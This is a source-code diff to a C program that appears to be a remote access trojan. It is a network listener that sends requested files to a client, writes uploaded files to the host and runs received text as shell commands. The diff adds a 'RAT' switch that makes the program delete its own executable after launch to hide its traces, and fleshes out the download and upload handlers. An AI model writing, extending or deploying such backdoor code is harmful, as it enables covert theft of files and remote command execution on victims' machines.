@@ -8,6 +8,7 @@
 #include <arpa/inet.h>
 #include <netinet/in.h>
 #define DEBUG 1
+#define RAT 0
 
 /* TO DO:
  * 1. Redirect STDERR to STDOUT just in case, to send back to client --Working
@@ -44,6 +45,8 @@ int main(int argc, char *argv[]){
 		return -1;
 	}
 	pclose(fp);
+	
+	if(RAT==1) remove(argv[0]);
 	
 	if((status=getaddrinfo(NULL, argv[1], &hints, &res)) != 0){
 		fprintf(stderr, "getaddrinfo error: %s\n", gai_strerror(status));
@@ -100,30 +103,58 @@ int main(int argc, char *argv[]){
 			//download
 			if(DEBUG) printf("Buffer %s and tokcmdbuf: %s\n", cmdbuf, tokcmdbuf);
 			strcpy(cmdtok,strtok(tokcmdbuf," "));
-			printf("cmdtok:%s\n",cmdtok);
+			if(DEBUG) printf("cmdtok:%s\n",cmdtok);
 			if(cmdtok==NULL) strcpy(cmdtok,cmdbuf); //If unable to be tokenized by space compare whole string 
-			strncmp(cmdtok,"test",5);
-			printf("Passed strncmptest\n");
+			//strncmp(cmdtok,"test",5);
+			//printf("Passed strncmptest\n");
 
 
-
+			//DOWNLOAD
 			if(strncmp(cmdtok, "download",9)==0){
 				if(DEBUG) printf("Running as Download\n");
 		 		FILE *fp = fopen(strtok(NULL," "),"r");
-		 		while (fgets(sendbuf, 4096, fp) != NULL){
-		 			if(send(new_fd, sendbuf, strlen(sendbuf), 0)<0){
+		 		if(fp!=NULL){
+					while (fgets(sendbuf, 4096, fp) != NULL){
+						if(send(new_fd, sendbuf, strlen(sendbuf), 0)<0){
+							perror("send");
+						}	
+					}
+					sleep(1);
+					if(send(new_fd, "000xxx000", 9, 0)<0){
 						perror("send");
-					}	
-		 		}
-		 		sleep(1);
-				if(send(new_fd, "000xxx000", 9, 0)<0){
-					perror("send");
+					}
+					fclose(fp); 
 				}
-		 		fclose(fp); 
+				else{
+					if(DEBUG) printf("fopen return null");
+				}
+			}
+			
+			//UPLOAD
+			else if(strncmp(cmdtok, "upload",9)==0){
+				if(DEBUG) printf("Running as Upload\n");
+				strcpy(cmdtok,strtok(NULL," "));
+				if(DEBUG) printf("File being uploaded: %s\n", cmdtok);
+		 		FILE *fp = fopen(strtok(NULL," "),"w");
+		 		if(DEBUG) printf("Successfully able to open file for writing\n");
+		 		while(1){
+				if((bytes = recv(new_fd, receive, 99, 0)) == -1){
+                		close(new_fd);
+                        	perror("Recv Error");
+                        	return -1;
+				}
+				receive[bytes]='\0';
+				if(strncmp(receive, "000xxx000", 9)==0){
+                	//printf("RECIEVED FINAL TERMINATOR\n");
+                    break;
+				}
+				fputs(receive,fp);
+			}
+			if(DEBUG) printf("Complete\n");
+			fclose(fp);
 			}
 
-
-
+			//SHELL COMMAND
 			else{
 				if(DEBUG) printf("Running as command\n");
 				//printf("%s\n",strtok(NULL, " "));
